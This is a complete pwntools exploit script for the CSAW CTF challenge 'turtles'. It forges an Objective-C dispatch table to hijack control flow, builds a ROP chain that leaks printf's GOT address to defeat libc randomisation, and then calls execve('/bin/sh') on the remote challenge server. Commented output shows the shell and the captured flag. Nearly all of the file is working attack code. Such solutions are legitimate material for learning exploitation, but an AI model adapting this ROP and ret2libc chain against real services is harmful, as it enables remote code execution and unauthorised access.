#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import os

from pwn import *

context(arch="amd64", os="linux")

binary = ELF("./turtles")

libc = ELF("./libc-amd64-2.19-18_deb8u10.so")

io = remote("pwn.chal.csaw.io", 9003)

# by integeruser

# have a look at the implementation of `objc_msg_lookup()` at https://github.com/gcc-mirror/gcc/blob/master/libobjc/sendmsg.c#L431
# and `sarray_get_safe()` at https://github.com/gcc-mirror/gcc/blob/master/libobjc/objc-private/sarray.h#L235


def execute(rop):
    # receive the address of a turtle
    io.recvuntil("Here is a Turtle: ")
    turtle_addr = int(io.recvline(), 16)
    io.success("turtle_addr: %#x" % turtle_addr)

    # send the payload
    fake_dtable_addr = turtle_addr + 0x80
    ret_addr_value = 0x400d3b  # : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    io.send(
        fit(
            {
                cyclic_find("aaaa"): p64(turtle_addr),
                cyclic_find("caaa"): p64(fake_dtable_addr),
                cyclic_find("eaaa"): bytes(rop),
                cyclic_find("qaaa"): p64(fake_dtable_addr),
                0x80: p64(fake_dtable_addr + 0x08 - (0x64 * 8)),
                0x88: p64(fake_dtable_addr + 0x10 - (0x15 * 8)),
                0x90: p64(ret_addr_value),
            },
            length=200,
        )
    )


# use ROP to...
rop = ROP([binary])
rop.raw(rop.find_gadget(["pop rdi", "ret"]))
rop.raw(p64(binary.symbols["got.printf"]))
# ...print the GOT entry of `printf()`...
rop.raw(p64(binary.symbols["plt.printf"]))
# ...and then restart the program
# .text:0000000000400A7D                 mov     rdi, offset main ; main
# .text:0000000000400A84                 call    ___libc_start_main
rop.raw(p64(0x400A7D))

execute(rop)

# the address of `printf()` is leaked, and we can compute the base address of libc
printf_addr = u64(io.recvn(6).ljust(8, "\0"))
libc.address = libc.address + (printf_addr - libc.symbols["printf"])
io.success("libc.address: %#x" % libc.address)


# now, the program has been restarted and is in its initial state: use the same technique to spawn a shell
rop = ROP([libc])
rop.execve(next(libc.search("/bin/sh")), 0, 0)

execute(rop)

# enjoy the (turtle) shell
io.interactive()
# $ ./turtles.py REMOTE
# [*] '/home/vagrant/vbox/turtles/turtles'
#     Arch:     amd64-64-little
#     RELRO:    No RELRO
#     Stack:    No canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x400000)
# [*] '/home/vagrant/vbox/turtles/libc-amd64-2.19-18_deb8u10.so'
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
# [+] Opening connection to pwn.chal.csaw.io on port 9003: Done
# [+] turtle_addr: 0xe46a00
# [+] printf_addr: 0x7f4542d81cf0
# [+] libc.address: 0x7f4542d31000
# [+] turtle_addr: 0xe327b0
# [*] Loaded cached gadgets for './libc-amd64-2.19-18_deb8u10.so'
# [*] Switching to interactive mode
# $ ls
# flag
# libs
# turtles
# $ cat flag
# flag{i_like_turtl3$_do_u?}
